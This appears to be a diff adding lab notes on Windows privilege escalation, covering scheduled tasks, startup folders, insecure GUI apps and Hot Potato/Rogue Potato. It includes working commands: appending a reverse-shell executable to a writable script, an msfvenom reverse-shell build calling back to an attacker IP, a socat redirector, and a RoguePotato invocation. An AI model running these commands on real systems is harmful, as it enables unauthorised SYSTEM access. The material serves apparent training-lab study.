@@ -253,3 +253,45 @@ SAM/SYSTEM Locations C:\Windows\System32\config directory.
 Resource:
 1. https://www.kali.org/tools/passing-the-hash/
 2. https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/
+
+# Scheduled Tasks
+
+Windows can be configured to run tasks at specific times, periodically or when triggered by some event. Tasks usually run with the privileges of the user who created them, however administrators can configure tasks to run as other users, including SYSTEM. 
+
+# Task 13 Scheduled Tasks
+
+Query the CleanUp.ps1: ```C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1```
+
+Run the reverse.exe in a file: ```echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1```
+
+# Insecure GUI Apps 
+
+Some applications are run with admin privileges. An attacker could trigger the application to run and then use the directory bar to rin cmd.exe
+
+# Startup Apps 
+Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory.
+The defaukt directory in Windows: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+If we can create files in this directory, we can use reverse shell executable and escalate privileges.
+
+![alt text](image.png)
+
+# Hot Potato
+
+Hot Potato is the name of an attack that uses a spoofing attack along with an NTLM relay attack to gain SYSTEM privileges. 
+The attack tricks Windows into authentication as the SYSTEM user to fake HTTP server using NTLM. The NTLM credentials then get relayed to SMB in order to gain command execution. 
+
+# Task 16 Token Impersonation - Rogue Potato
+
+```sudo socat tcp-listen:135,reuseaddr,fork tcp:10.201.115.175:9999```
+
+```msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.15.43 LPORT=8888 -f exe -o reverse2.exe```
+
+```C:\PrivEsc\PsExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe``` --> local system on a victim
+
+From the shell (local system):
+```C:\PrivEsc\RoguePotato.exe -r 10.5.16.43 -e "C:\PrivEsc\reverse2.exe" -l 9999```
+
+
+
+
+
